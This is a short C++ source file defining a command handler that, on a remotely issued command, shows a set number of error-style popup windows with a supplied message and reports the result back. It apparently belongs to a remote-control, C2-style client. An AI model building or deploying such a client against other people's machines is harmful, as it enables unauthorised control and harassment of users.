#include <Windows.h>

#include "PopupSpamHandler.h"
#include "PopupCommand.h"
#include "WinUtils.h"
#include "ReturnProductRequest.h"
#include "PopupProduct.h"

PopupSpamHandler::PopupSpamHandler(const std::string& client_id)
	: ICommandHandler(client_id)
{
}

std::unique_ptr<IRequest> PopupSpamHandler::handle(std::shared_ptr<BasicCommand>& command)
{
    std::shared_ptr<PopupCommand> popup_command = std::static_pointer_cast<PopupCommand>(command);
    win_utils::do_popups(POPUPS_COUNT, "Popup", popup_command->get_message(), MB_ICONERROR);
    return std::make_unique<ReturnProductRequest>(
        RequestHeader{ RequestType::ReturnProduct, m_client_id },
        command->get_command_id(),
        PopupProduct(command->get_command_id(), true).serialize()
    );
}
